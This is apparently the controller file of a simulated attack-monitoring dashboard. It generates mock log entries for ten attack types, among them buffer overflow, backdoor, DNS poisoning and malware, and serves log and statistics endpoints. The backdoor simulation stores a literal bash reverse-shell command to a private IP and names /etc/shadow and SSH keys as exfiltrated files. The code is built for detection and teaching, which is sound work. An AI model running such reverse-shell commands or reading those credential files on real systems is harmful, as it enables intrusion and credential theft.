// ============================================================
// controllers/attack.controller.js — 10 attack simulations
// ============================================================
const AttackLog = require('../models/attackLog.model');
const Alert     = require('../models/alert.model');

// Helper: create attack log + alert + emit socket
const logAttack = async (req, type, severity, details, description) => {
  const target = req.body?.target || `PID-${Math.floor(Math.random()*9000)+1000}`;
  const log = await AttackLog.create({
    attackType: type, severity, status: 'DETECTED',
    target, description, details,
    triggeredBy: req.user?._id,
    ipAddress: req.ip
  });

  await Alert.create({
    title:    `⚠ ${type} Detected`,
    message:  `${type} attack simulated with ${severity} severity on ${target}.`,
    severity: severity === 'CRITICAL' ? 'CRITICAL' : severity === 'HIGH' ? 'DANGER' : 'HIGH',
    attackLog: log._id
  });

  // Emit to socket if available
  const io = req.app?.get('io');
  if (io) io.emit('new-attack-alert', { type, severity, target, timestamp: new Date() });

  return log;
};

// ── 1. Buffer Overflow ──────────────────────────────────────
const simulateBufferOverflow = async (req, res) => {
  try {
    const bufferSize  = 256;
    const inputSize   = Math.floor(Math.random() * 512) + 300;
    const overflowBy  = inputSize - bufferSize;
    const addresses   = Array.from({length: 5}, () => `0x${Math.floor(Math.random()*0xFFFF).toString(16).padStart(4,'0')}`);

    const details = {
      bufferSize, inputSize, overflowBy,
      corruptedAddresses: addresses,
      memoryRegion: 'Stack',
      vulnerability: 'Stack-based Buffer Overflow',
      payload: 'A'.repeat(50) + '\\x90'.repeat(20) + '\\xef\\xbe\\xad\\xde',
      status: 'DETECTED', severity: 'CRITICAL'
    };

    const log = await logAttack(req, 'Buffer Overflow', 'CRITICAL', details,
      `Stack buffer overflow detected: input size ${inputSize}B exceeded buffer ${bufferSize}B by ${overflowBy}B`);

    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 2. Trapdoor Attack ──────────────────────────────────────
const simulateTrapdoor = async (req, res) => {
  try {
    const hiddenPort = Math.floor(Math.random() * 10000) + 40000;
    const details = {
      hiddenPort,
      backdoorUser: `sys_${Math.random().toString(36).slice(2,8)}`,
      accessLevel: 'ROOT',
      triggerCode: `0x${Math.floor(Math.random()*0xFFFF).toString(16)}`,
      method: 'Hardcoded developer backdoor',
      status: 'DETECTED', severity: 'HIGH'
    };
    const log = await logAttack(req, 'Trapdoor Attack', 'HIGH', details,
      `Hidden trapdoor found listening on port ${hiddenPort} with root access`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 3. Backdoor Attack ──────────────────────────────────────
const simulateBackdoor = async (req, res) => {
  try {
    const details = {
      payload: '/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',
      persistenceMethod: 'Cron job + systemd service',
      c2Server: `185.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
      encryptionUsed: 'AES-256',
      exfiltratedData: ['/etc/passwd', '/etc/shadow', '~/.ssh/id_rsa'],
      status: 'DETECTED', severity: 'CRITICAL'
    };
    const log = await logAttack(req, 'Backdoor Attack', 'CRITICAL', details,
      'Reverse shell backdoor detected with C2 communication and data exfiltration');
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 4. Cache Poisoning ──────────────────────────────────────
const simulateCachePoisoning = async (req, res) => {
  try {
    const domains = ['google.com','github.com','api.internal','auth.system'];
    const poisoned = domains.slice(0, Math.floor(Math.random()*3)+1);
    const details = {
      poisonedDomains: poisoned,
      fakeIPs: poisoned.map(() => `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`),
      cacheType: 'DNS Cache',
      method: 'DNS Spoofing via forged UDP responses',
      ttlManipulated: true,
      status: 'DETECTED', severity: 'HIGH'
    };
    const log = await logAttack(req, 'Cache Poisoning', 'HIGH', details,
      `DNS cache poisoning: ${poisoned.join(', ')} redirected to attacker-controlled IPs`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 5. Malware Injection ────────────────────────────────────
const simulateMalware = async (req, res) => {
  try {
    const types = ['Ransomware','Rootkit','Keylogger','Trojan','Spyware'];
    const malwareType = types[Math.floor(Math.random()*types.length)];
    const details = {
      malwareType,
      signature: `MAL-${Date.now().toString(36).toUpperCase()}`,
      infectionsCount: Math.floor(Math.random()*50)+1,
      spreadMethod: ['Email attachment', 'Drive-by download', 'Phishing link'][Math.floor(Math.random()*3)],
      encryptedFiles: malwareType === 'Ransomware' ? Math.floor(Math.random()*1000)+100 : 0,
      affectedProcesses: [`svchost.exe (PID ${Math.floor(Math.random()*9000)+1000})`, `explorer.exe`],
      status: 'DETECTED', severity: 'CRITICAL'
    };
    const log = await logAttack(req, 'Malware Injection', 'CRITICAL', details,
      `${malwareType} detected with signature ${details.signature}. ${details.infectionsCount} system files infected.`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 6. Deadlock ─────────────────────────────────────────────
const simulateDeadlock = async (req, res) => {
  try {
    const numProcesses = 4;
    const processes = Array.from({length: numProcesses}, (_, i) => ({
      id: `P${i+1}`,
      pid: Math.floor(Math.random()*9000)+1000,
      holding: `R${(i%3)+1}`,
      waiting: `R${((i+1)%3)+1}`,
      state: 'BLOCKED'
    }));
    const details = {
      processes,
      resources: ['R1 (Mutex Lock)', 'R2 (File Handle)', 'R3 (Network Socket)'],
      cycleDetected: true,
      cycle: processes.map(p=>p.id).join(' → ') + ` → ${processes[0].id}`,
      detectionMethod: 'Resource Allocation Graph Cycle Detection',
      status: 'DETECTED', severity: 'HIGH'
    };
    const log = await logAttack(req, 'Deadlock', 'HIGH', details,
      `Deadlock detected: ${details.cycle}. ${numProcesses} processes permanently blocked.`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 7. CPU Starvation ───────────────────────────────────────
const simulateCPUStarvation = async (req, res) => {
  try {
    const cpuUsage = (Math.random()*20 + 80).toFixed(1);
    const details = {
      cpuUsage: parseFloat(cpuUsage),
      starvingProcesses: [
        { pid: Math.floor(Math.random()*9000)+1000, name: 'user_process', waitTime: '47s', priority: 5 },
        { pid: Math.floor(Math.random()*9000)+1000, name: 'db_service', waitTime: '32s', priority: 3 }
      ],
      dominantProcess: { pid: Math.floor(Math.random()*9000)+1000, name: 'crypto_miner', cpuShare: '94%', priority: 1 },
      schedulerType: 'Priority (Non-preemptive)',
      status: 'DETECTED', severity: 'MEDIUM'
    };
    const log = await logAttack(req, 'CPU Starvation', 'MEDIUM', details,
      `CPU at ${cpuUsage}% — low-priority processes starving. Possible crypto-mining or fork bomb.`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 8. Unauthorized Access ──────────────────────────────────
const simulateUnauthorizedAccess = async (req, res) => {
  try {
    const details = {
      attemptedResource: ['/etc/shadow', '/root/.ssh/', '/proc/kcore'][Math.floor(Math.random()*3)],
      sourceProcess: `malicious_proc (PID ${Math.floor(Math.random()*9000)+1000})`,
      privilege: 'ROOT / UID 0',
      method: 'Privilege Escalation via SUID binary',
      failedAttempts: Math.floor(Math.random()*20)+5,
      ipSource: `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
      status: 'DETECTED', severity: 'HIGH'
    };
    const log = await logAttack(req, 'Unauthorized Access', 'HIGH', details,
      `Unauthorized process attempting root access via privilege escalation. ${details.failedAttempts} attempts detected.`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 9. Suspicious IPC ───────────────────────────────────────
const simulateSuspiciousIPC = async (req, res) => {
  try {
    const details = {
      ipcType: ['Shared Memory', 'Message Queue', 'Named Pipe'][Math.floor(Math.random()*3)],
      suspiciousPatterns: ['Encrypted payload in IPC message', 'Cross-privilege IPC call', 'IPC flooding attempt'],
      processA: `legit_service (PID ${Math.floor(Math.random()*9000)+1000})`,
      processB: `unknown_proc (PID ${Math.floor(Math.random()*9000)+1000})`,
      dataExchanged: `${(Math.random()*10+1).toFixed(1)} MB`,
      anomalyScore: (Math.random()*0.4+0.6).toFixed(2),
      status: 'DETECTED', severity: 'MEDIUM'
    };
    const log = await logAttack(req, 'Suspicious IPC', 'MEDIUM', details,
      `Suspicious IPC communication detected between processes. Anomaly score: ${details.anomalyScore}`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// ── 10. Memory Abuse ────────────────────────────────────────
const simulateMemoryAbuse = async (req, res) => {
  try {
    const memoryUsed = (Math.random()*2+2).toFixed(2);
    const details = {
      memoryLeaked: `${memoryUsed} GB`,
      memoryUsagePercent: (Math.random()*20+80).toFixed(1),
      affectedProcess: `memory_hog (PID ${Math.floor(Math.random()*9000)+1000})`,
      leakRate: `${(Math.random()*100+50).toFixed(0)} MB/min`,
      heapFragmentation: `${(Math.random()*40+50).toFixed(1)}%`,
      oomKillRisk: true,
      techniques: ['Heap spray', 'Use-after-free', 'Double-free vulnerability'],
      status: 'DETECTED', severity: 'HIGH'
    };
    const log = await logAttack(req, 'Memory Abuse', 'HIGH', details,
      `Memory abuse detected: ${memoryUsed}GB leaked. OOM kill risk. Heap fragmentation at ${details.heapFragmentation}`);
    res.json({ success: true, data: { ...details, logId: log._id, target: log.target } });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// GET /api/v1/attacks
const getAttackLogs = async (req, res) => {
  try {
    const page  = parseInt(req.query.page)  || 1;
    const limit = parseInt(req.query.limit) || 20;
    const skip  = (page - 1) * limit;

    const filter = {};
    if (req.query.severity) filter.severity = req.query.severity;
    if (req.query.status)   filter.status   = req.query.status;

    const [attacks, total] = await Promise.all([
      AttackLog.find(filter).sort({ createdAt: -1 }).skip(skip).limit(limit).populate('triggeredBy','username'),
      AttackLog.countDocuments(filter)
    ]);

    res.json({ success: true, data: attacks, total, page, pages: Math.ceil(total/limit) });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// GET /api/v1/attacks/:id
const getAttackById = async (req, res) => {
  try {
    const attack = await AttackLog.findById(req.params.id).populate('triggeredBy','username email');
    if (!attack) return res.status(404).json({ success: false, message: 'Attack log not found' });
    res.json({ success: true, data: attack });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

// GET /api/v1/attacks/stats
const getAttackStats = async (req, res) => {
  try {
    const [bySeverity, byStatus, recent] = await Promise.all([
      AttackLog.aggregate([{ $group: { _id: '$severity', count: { $sum: 1 } } }]),
      AttackLog.aggregate([{ $group: { _id: '$status',   count: { $sum: 1 } } }]),
      AttackLog.find().sort({ createdAt: -1 }).limit(5)
    ]);

    const sevMap = {}; bySeverity.forEach(s => { sevMap[s._id] = s.count; });
    const staMap = {}; byStatus.forEach(s  => { staMap[s._id] = s.count; });

    res.json({ success: true, data: {
      total: await AttackLog.countDocuments(),
      bySeverity: sevMap,
      byStatus: staMap,
      recent
    }});
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
};

module.exports = {
  simulateBufferOverflow, simulateTrapdoor, simulateBackdoor,
  simulateCachePoisoning, simulateMalware, simulateDeadlock,
  simulateCPUStarvation, simulateUnauthorizedAccess,
  simulateSuspiciousIPC, simulateMemoryAbuse,
  getAttackLogs, getAttackById, getAttackStats
};
